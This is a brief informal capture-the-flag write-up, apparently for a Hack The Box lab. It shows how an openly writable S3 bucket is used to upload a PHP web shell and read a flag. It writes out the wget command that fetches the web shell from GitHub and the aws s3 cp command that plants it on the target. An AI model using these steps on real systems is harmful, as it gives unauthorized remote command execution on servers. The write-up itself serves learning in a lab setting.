this box learned us about aws amazon services

so adding the dns records to the vms ip
we can connect to s3.{boxip} and see the status
(in real scenerios we woudl use gobuster or ffuf to find the subdomain for the s3 backend url)

then connecting to the s3 bucket:
aws configure
`aws s3 ls --endpoint-url http://s3.{boxip}/`

here we found the s3buckets name
and can list the files in it:
`aws s3 ls s3://{boxip} --endpoint-url http://s3.{boxip}/`

as we can just connect we can try to upload a webshell,
i used this `https://github.com/WhiteWinterWolf/wwwolf-php-webshell` bcs its a simplistic and fast web shell:
`wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -O ./tools/phpwebshell.php`
`aws s3 cp ./tools/phpwebshell.php s3://thetoppers.htb/phpwebshell.php --endpoint-url http://s3.thetoppers.htb/`

than we could go on the site: "http://{boxip}/phpwebshell.php"

then i tried try ls, ls ..
and found the flag "cat ../flag.txt"
